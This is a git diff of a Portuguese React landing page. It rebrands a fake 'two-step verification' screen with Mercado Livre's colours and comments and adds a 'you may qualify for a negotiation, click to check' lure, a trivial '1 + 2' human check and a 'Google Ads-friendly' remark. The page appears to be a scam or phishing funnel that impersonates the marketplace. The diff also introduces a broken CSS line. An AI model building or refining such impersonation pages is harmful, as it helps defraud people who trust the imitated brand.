@@ -64,7 +64,7 @@ export default function Quiz() {
     <div className="page">
       <main className="wrapper">
         <section className="card">
-          <h1 className="title">Verificação de Segurança</h1>
+          <h1 className="title">Consulte Fácil</h1>
 
           <div className="iconWrap" aria-hidden="true">
             <div className="iconCircle">
@@ -76,7 +76,7 @@ export default function Quiz() {
                 aria-label="Protegido"
               >
                 <defs>
-                  {/* ESCUDO EM AZUL */}
+                  {/* ESCUDO EM AZUL (MERCADO LIVRE) */}
                   <radialGradient id="shieldGrad" cx="50%" cy="30%" r="70%">
                     <stop offset="0%" stopColor="#3f8efc" stopOpacity="0.98" />
                     <stop offset="100%" stopColor="#1259c3" stopOpacity="1" />
@@ -110,7 +110,7 @@ export default function Quiz() {
           </div>
 
           <p className="subtitle">
-            Para continuar, confirme sua identidade com uma verificação rápida em 2 etapas.
+            Você pode estar apto à negociação. Clique abaixo para consultar
           </p>
 
           <button
@@ -119,7 +119,7 @@ export default function Quiz() {
             aria-haspopup="dialog"
             aria-controls="modal-root"
           >
-            INICIAR 2FA
+            CONSULTAR AGORA
           </button>
 
           <nav className="links" aria-label="links-legais">
@@ -132,13 +132,13 @@ export default function Quiz() {
 
       {cookiesOpen && (
         <div className="cookieBar" role="region" aria-label="cookies">
-          <span>Usamos cookies para manter sua sessão segura e melhorar a experiência.</span>
+          <span>Usamos cookies para melhorar sua experiência.</span>
           <button
             type="button"
             className="cookieBtn"
             onClick={() => setCookiesOpen(false)}
           >
-            Entendi
+            Aceitar
           </button>
         </div>
       )}
@@ -155,13 +155,13 @@ export default function Quiz() {
             {step === 1 && (
               <>
                 <h2 id="modal-title" className="modalTitle">
-                  Confirmação em 2 etapas
+                  Bem-vindo ao portal de atendimento
                 </h2>
                 <p className="modalText">
-                  Vamos validar sua sessão. Isso leva apenas alguns segundos.
+                  Para continuar, faremos uma verificação simples.
                 </p>
                 <button className="primary microTilt" onClick={() => setStep(2)}>
-                  Continuar
+                  Iniciar verificação
                 </button>
                 <button
                   className="ghost"
@@ -171,21 +171,21 @@ export default function Quiz() {
                     setAnswer("");
                   }}
                 >
-                  Agora não
+                  Cancelar
                 </button>
               </>
             )}
 
             {step === 2 && (
               <>
-                <h3 className="sectionOver">Etapa 2 de 2</h3>
-                <h2 className="question">Digite o código: 1 + 2</h2>
+                <h3 className="sectionOver">Prova humana para prosseguir</h3>
+                <h2 className="question">Quanto é 1 + 2?</h2>
 
                 <input
                   type="text"
                   value={answer}
                   onChange={(e) => setAnswer(e.target.value)}
-                  placeholder="Código de verificação"
+                  placeholder="Digite sua resposta"
                   className="input"
                 />
 
@@ -195,7 +195,7 @@ export default function Quiz() {
                     onClick={handleSubmit}
                     disabled={loading}
                   >
-                    {loading ? "Validando..." : "Confirmar"}
+                    {loading ? "Verificando..." : "Prosseguir"}
                   </button>
                   <button
                     className="ghost"
@@ -225,7 +225,7 @@ export default function Quiz() {
         }
         body {
           margin: 0;
-          background: #ffffff; /* branco */
+          background: #fff9e6; /* amarelo bem claro Mercado Livre */
           color: #0f172a;
           font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
           -webkit-font-smoothing: antialiased;
@@ -236,9 +236,9 @@ export default function Quiz() {
         a {
           outline: none;
         }
-        /* Acessibilidade e navegação por teclado */
+        /* Acessibilidade e navegação por teclado (Google Ads-friendly) */
         :focus-visible {
-          outline: 3px solid rgba(18, 89, 195, 0.45); /* azul */
+          outline: 3px solid rgba(18, 89, 195, 0.45); /* azul Mercado Livre */
           outline-offset: 2px;
         }
         @media (prefers-reduced-motion: reduce) {
@@ -257,7 +257,7 @@ export default function Quiz() {
           display: grid;
           place-items: center;
           padding: 32px 16px 96px;
-          background: #f5f9ff; /* branco azulado */
+          background: #fff7d6; /* fundo amarelo suave */
         }
 
         .wrapper {
@@ -271,7 +271,7 @@ export default function Quiz() {
           background: #ffffff;
           border-radius: 16px;
           padding: 36px 28px 28px;
-          border: 1px solid rgba(18, 89, 195, 0.18); /* contorno azul */
+          border: 1px solid rgba(18, 89, 195, 0.15); /* contorno azul */
           box-shadow: 0 8px 24px rgba(15, 23, 42, 0.06);
           text-align: center;
         }
@@ -280,7 +280,7 @@ export default function Quiz() {
           margin: 0 0 8px;
           font-size: clamp(22px, 3.6vw, 28px);
           font-weight: 800;
-          color: #0b1b3a;
+          color: #111827;
           letter-spacing: 0.2px;
         }
 
@@ -295,7 +295,12 @@ export default function Quiz() {
           border-radius: 999px;
           display: grid;
           place-items: center;
-          background: radial-gradient(circle at 30% 30%, #ffffff, #e7f0ff 60%, #d7e6ff);
+          background: radial-gradient(
+            circle at 30% 30%,
+            #fffef5,
+            #ffe600 60%,
+            #ffd400
+          ); /* amarelo ML */
           border: 1px solid rgba(18, 89, 195, 0.18);
           box-shadow: inset 0 1px 6px rgba(0, 0, 0, 0.04),
             0 8px 20px rgba(15, 23, 42, 0.08);
@@ -315,7 +320,7 @@ export default function Quiz() {
           cursor: pointer;
           padding: 12px 22px;
           border-radius: 10px;
-          background: #1259c3; /* azul */
+          background: #1259c3; /* azul Mercado Livre */
           color: #ffffff;
           font-weight: 800;
           letter-spacing: 0.2px;
@@ -399,7 +404,7 @@ export default function Quiz() {
           inset: 0;
           display: grid;
           place-items: center;
-          background: rgba(2, 10, 25, 0.55); /* azul bem escuro translúcido */
+          background: rgba(17, 24, 39, 0.45);
           backdrop-filter: blur(2px);
           z-index: 50;
         }
@@ -422,7 +427,7 @@ export default function Quiz() {
             transform: scale(0.985);
           }
           to {
-            opacity: 1;
+            opacity: 1);
             transform: scale(1);
           }
         }
@@ -431,7 +436,7 @@ export default function Quiz() {
           margin: 4px 0 8px;
           font-size: clamp(20px, 4vw, 26px);
           font-weight: 800;
-          color: #0b1b3a;
+          color: #111827;
         }
         .modalText {
           margin: 0 0 18px;
@@ -443,19 +448,19 @@ export default function Quiz() {
           font-size: 12px;
           letter-spacing: 0.6px;
           text-transform: uppercase;
-          color: #1259c3; /* azul */
+          color: #0b3f8a; /* azul escuro */
         }
         .question {
           margin: 0 0 12px;
           font-size: 20px;
           font-weight: 800;
-          color: #0b1b3a;
+          color: #111827;
         }
         .input {
           width: 100%;
           padding: 12px 14px;
           border-radius: 10px;
-          border: 1px solid rgba(18, 89, 195, 0.42);
+          border: 1px solid rgba(18, 89, 195, 0.4);
           outline: none;
           margin: 4px 0 16px;
           text-align: center;
@@ -524,7 +529,7 @@ export default function Quiz() {
             box-shadow 0.18s ease;
         }
         .ghost:hover {
-          background: rgba(18, 89, 195, 0.08); /* azul bem clarinho */
+          background: rgba(255, 230, 128, 0.35); /* amarelo clarinho */
           transform: translateY(-1px);
         }
         .ghost:active {
